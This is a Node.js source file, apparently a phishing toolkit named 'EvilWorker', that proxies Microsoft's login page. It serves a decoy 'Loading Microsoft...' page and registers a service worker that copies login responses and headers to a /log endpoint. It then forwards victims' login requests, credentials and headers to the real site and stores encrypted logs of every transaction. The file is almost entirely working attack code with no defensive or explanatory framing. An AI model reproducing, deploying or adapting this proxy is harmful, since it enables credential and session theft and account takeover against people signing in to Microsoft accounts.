const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Configuration - CHANGE THESE
const ENCRYPTION_KEY = "Yy+DWj+4bf/kqkg9eaqeQpvVBFZzrHKcJIKGYivp4wI=";
const PROXY_TARGET = "https://login.microsoftonline.com";
const PHISHING_PORT = 3000;

// Create logs directory
const LOGS_DIR = path.join(__dirname, 'phishing_logs');
if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR);

// Encryption function
function encryptData(data) {
    return new Promise((resolve) => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        resolve({ iv: iv.toString('hex'), encryptedData: encrypted });
    });
}

// Logging function
function logHTTPProxyTransaction(req, targetUrl, requestBody) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        method: req.method,
        url: req.url,
        targetUrl: targetUrl,
        headers: req.headers,
        requestBody: requestBody,
        ip: req.socket.remoteAddress
    };
    const logFileName = path.join(LOGS_DIR, `${new Date().toISOString().replace(/:/g, '-')}.log`);
    encryptData(logEntry).then(encrypted => fs.writeFileSync(logFileName, JSON.stringify(encrypted)));
}

// Create server
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    // ===== 1. SERVE INDEX.HTML AT ROOT =====
    if (pathname === '/') {
        const html = `<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', async () => {
                try {
                    await navigator.serviceWorker.register('/worker.js', { scope: '/' });
                    console.log('Service Worker registered');
                    window.location.href = '/login?redirect_urI=${encodeURIComponent(PROXY_TARGET)}';
                } catch (error) {
                    console.log('SW failed:', error);
                    window.location.href = '/login?redirect_urI=${encodeURIComponent(PROXY_TARGET)}';
                }
            });
        } else {
            window.location.href = '/login?redirect_urI=${encodeURIComponent(PROXY_TARGET)}';
        }
    </script>
</head>
<body><p>Loading Microsoft...</p></body>
</html>`;
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(html);
        return;
    }

    // ===== 2. SERVE SERVICE WORKER =====
    if (pathname === '/worker.js') {
        const workerCode = `
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // Clone the response to log it
            const clonedResponse = response.clone();
            if (event.request.url.includes('login.microsoftonline.com')) {
                clonedResponse.text().then(body => {
                    fetch('/log', {
                        method: 'POST',
                        body: JSON.stringify({
                            url: event.request.url,
                            body: body,
                            headers: [...event.request.headers]
                        })
                    });
                });
            }
            return response;
        })
    );
});`;
        res.writeHead(200, { 
            'Content-Type': 'application/javascript',
            'Service-Worker-Allowed': '/'
        });
        res.end(workerCode);
        return;
    }

    // ===== 3. HANDLE LOGGING ENDPOINT =====
    if (pathname === '/log' && req.method === 'POST') {
        let body = [];
        req.on('data', chunk => body.push(chunk));
        req.on('end', () => {
            logHTTPProxyTransaction(req, '/log', Buffer.concat(body).toString());
            res.writeHead(200);
            res.end('Logged');
        });
        return;
    }

    // ===== 4. HANDLE LOGIN PROXY =====
    if (pathname === '/login' && parsedUrl.query.redirect_urI) {
        const targetUrl = decodeURIComponent(parsedUrl.query.redirect_urI);
        let body = [];
        req.on('data', chunk => body.push(chunk));
        req.on('end', () => {
            body = Buffer.concat(body).toString();
            logHTTPProxyTransaction(req, targetUrl, body);
            
            const options = url.parse(targetUrl);
            options.method = req.method;
            options.headers = req.headers;
            options.headers.host = options.host;
            
            const proxyReq = https.request(options, (proxyRes) => {
                res.writeHead(proxyRes.statusCode, proxyRes.headers);
                proxyRes.pipe(res);
            });
            proxyReq.on('error', () => {
                res.writeHead(502);
                res.end('Bad Gateway');
            });
            if (body) proxyReq.write(body);
            proxyReq.end();
        });
        return;
    }

    // ===== 5. 404 =====
    res.writeHead(404);
    res.end('Not found');
});

server.listen(PHISHING_PORT, () => {
    console.log(`EvilWorker running on port ${PHISHING_PORT}`);
});
